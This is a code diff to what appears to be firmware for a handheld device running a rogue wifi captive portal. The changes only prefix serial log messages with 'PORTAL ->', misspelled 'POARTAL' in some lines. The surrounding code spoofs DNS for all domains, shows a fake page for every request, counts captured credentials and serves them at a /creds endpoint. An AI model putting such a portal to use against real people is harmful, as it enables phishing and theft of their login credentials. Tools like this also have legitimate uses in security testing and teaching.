@@ -113,7 +113,7 @@ void confirmOrTypeSSID(){
 #endif
 
 void setupWiFi() {
-  Serial.println("Initializing WiFi");
+  Serial.println("PORTAL -> Initializing WiFi");
   #if defined(CARDPUTER)
   confirmOrTypeSSID();
   #endif // Cardputer
@@ -244,7 +244,7 @@ String ssid_GET() {
 
 String ssid_POST() {
   String ssid = getInputValue("ssid");
-  Serial.println("SSID Has been changed to " + ssid);
+  Serial.println("PORTAL -> SSID Has been changed to " + ssid);
   setSSID(ssid);
   printHomeToScreen();
   return getHtmlContents("Captive Portal shutting down and restarting with SSID <b>" + ssid + "</b>. Please reconnect.");
@@ -272,22 +272,22 @@ void blinkLed() {
 #endif
 
 void shutdownWebServer() {
-  Serial.println("Stopping DNS");
+  Serial.println("POARTAL -> Stopping DNS");
   dnsServer.stop();
-  Serial.println("Closing Webserver");
+  Serial.println("POARTAL -> Closing Webserver");
   webServer.close();
-  Serial.println("Stopping Webserver");
+  Serial.println("POARTAL -> Stopping Webserver");
   webServer.stop();
-  Serial.println("Setting WiFi to STA mode");
+  Serial.println("POARTAL -> Setting WiFi to STA mode");
   WiFi.mode(WIFI_MODE_STA);
-  Serial.println("Resetting SSID");
+  Serial.println("POARTAL -> Resetting SSID");
   getSSID();
 }
 
 void setupWebServer() {
-  Serial.println("Starting DNS");
+  Serial.println("PORTAL -> Starting DNS");
   dnsServer.start(DNS_PORT, "*", AP_GATEWAY);  // DNS spoofing (Only HTTP)
-  Serial.println("Setting up Webserver");
+  Serial.println("PORTAL -> Setting up Webserver");
   webServer.on("/post", []() {
     totalCapturedCredentials = totalCapturedCredentials + 1;
     webServer.send(HTTP_CODE, "text/html", index_POST());
@@ -307,30 +307,30 @@ void setupWebServer() {
 #endif
   });
   
-  Serial.println("Registering /creds");
+  Serial.println("PORTAL -> Registering /creds");
   webServer.on("/creds", []() {
     webServer.send(HTTP_CODE, "text/html", creds_GET());
   });
-  Serial.println("Registering /clear");
+  Serial.println("PORTAL -> Registering /clear");
   webServer.on("/clear", []() {
     webServer.send(HTTP_CODE, "text/html", clear_GET());
   });
-  Serial.println("Registering /ssid");
+  Serial.println("PORTAL -> Registering /ssid");
   webServer.on("/ssid", []() {
     webServer.send(HTTP_CODE, "text/html", ssid_GET());
   });
-  Serial.println("Registering /postssid");
+  Serial.println("PORTAL -> Registering /postssid");
   webServer.on("/postssid", []() {
     webServer.send(HTTP_CODE, "text/html", ssid_POST());
     shutdownWebServer();
     isSwitching=true;
     currentProc=25;
   });
-  Serial.println("Registering /*");
+  Serial.println("PORTAL -> Registering /*");
   webServer.onNotFound([]() {
     lastActivity = millis();
     webServer.send(HTTP_CODE, "text/html", index_GET());
   });
-  Serial.println("Starting Webserver");
+  Serial.println("PORTAL -> Starting Webserver");
   webServer.begin();
 }
